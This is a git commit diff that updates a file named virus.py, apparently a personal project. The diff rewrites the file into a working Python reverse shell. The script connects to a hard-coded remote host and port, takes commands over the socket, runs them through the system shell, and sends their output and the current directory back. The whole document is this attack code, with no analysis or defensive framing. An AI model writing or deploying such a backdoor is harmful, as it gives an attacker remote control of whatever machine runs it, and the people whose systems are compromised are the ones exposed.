56cdc5073a20c3582aea73cfa6db292560a8ebd8
dsxz19-2 <87105182+dsxz19-2@users.noreply.github.com>
2021-09-02 19:40:54 -0400

    Update virus.py

--- virus.py
+++ virus.py
@@ -1,12 +1,19 @@
-import socket
 import subprocess
+import socket
+import os
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((socket.gethostname(), 1234))
+s = socket.socket()
+host = "192.168.2.33"
+port = 9999
+s.connect((host, port))
 
 while True:
-    msg = s.recv(10000000)
-    print(msg.decode("utf-8"))
-    subprocess.Popen(msg.decode("utf-8"), shell=True)
-    if msg.decode("utf-8") == dir:
-        s.send()
+    cmd = s.recv(1024)
+    if cmd[:2].decode("utf-8") == "cd":
+        os.chdir(cmd[3:].decode("utf-8"))
+    if len(cmd) > 0:
+        cmd = subprocess.Popen(cmd[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_bytes = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_bytes, "utf-8")
+        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
+        print(output_str)
